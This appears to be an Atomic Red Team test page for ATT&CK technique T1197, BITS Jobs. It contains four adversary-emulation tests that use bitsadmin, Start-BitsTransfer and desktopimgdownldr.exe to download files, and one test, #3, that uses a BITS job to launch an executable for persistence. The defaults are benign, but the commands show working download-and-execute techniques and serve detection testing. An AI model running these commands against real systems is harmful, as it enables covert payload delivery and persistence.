---
tags: [T1197, atomic_test]
filename: "[[T1197 - BITS Jobs]]"
---
# T1197 - BITS Jobs

## Atomic Test #1 - Bitsadmin Download (cmd)
This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload

**Supported Platforms:** Windows


**auto_generated_guid:** 3c73d728-75fb-4180-a12f-6712864d7421





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_file | Remote file to download | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md|
| local_file | Local file path to save downloaded file | path | %temp%&#92;bitsadmin1_flag.ps1|


#### Attack Commands: Run with `command_prompt`! 


```cmd
bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}
```

#### Cleanup Commands:
```cmd
del #{local_file} >nul 2>&1
```





<br/>
<br/>

## Atomic Test #2 - Bitsadmin Download (PowerShell)
This test simulates an adversary leveraging bitsadmin.exe to download
and execute a payload leveraging PowerShell

Upon execution you will find a github markdown file downloaded to the Temp directory

**Supported Platforms:** Windows


**auto_generated_guid:** f63b8bc4-07e5-4112-acba-56f646f3f0bc





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_file | Remote file to download | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md|
| local_file | Local file path to save downloaded file | path | $env:TEMP&#92;bitsadmin2_flag.ps1|


#### Attack Commands: Run with `powershell`! 


```powershell
Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
```

#### Cleanup Commands:
```powershell
Remove-Item #{local_file} -ErrorAction Ignore
```





<br/>
<br/>

## Atomic Test #3 - Persist, Download, & Execute
This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.

**Supported Platforms:** Windows


**auto_generated_guid:** 62a06ec5-5754-47d2-bcfc-123d8314c6ae





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| command_path | Path of command to execute | path | C:&#92;Windows&#92;system32&#92;notepad.exe|
| bits_job_name | Name of BITS job | string | AtomicBITS|
| local_file | Local file path to save downloaded file | path | %temp%&#92;bitsadmin3_flag.ps1|
| remote_file | Remote file to download | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md|


#### Attack Commands: Run with `command_prompt`! 


```cmd
bitsadmin.exe /create #{bits_job_name}
bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL
bitsadmin.exe /resume #{bits_job_name}
ping -n 5 127.0.0.1 >nul 2>&1
bitsadmin.exe /complete #{bits_job_name}
```

#### Cleanup Commands:
```cmd
del #{local_file} >nul 2>&1
```





<br/>
<br/>

## Atomic Test #4 - Bits download using desktopimgdownldr.exe (cmd)
This test simulates using desktopimgdownldr.exe to download a malicious file
instead of a desktop or lockscreen background img. The process that actually makes 
the TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) 
and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/

**Supported Platforms:** Windows


**auto_generated_guid:** afb5e09e-e385-4dee-9a94-6ee60979d114





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| remote_file | Remote file to download | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md|
| download_path | Local file path to save downloaded file | path | SYSTEMROOT=C:&#92;Windows&#92;Temp|
| cleanup_path | path to delete file as part of cleanup_command | path | C:&#92;Windows&#92;Temp&#92;Personalization&#92;LockScreenImage|
| cleanup_file | file to remove as part of cleanup_command | string | *.md|


#### Attack Commands: Run with `command_prompt`! 


```cmd
set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr
```

#### Cleanup Commands:
```cmd
del #{cleanup_path}\#{cleanup_file} >nul 2>&1
```





<br/>
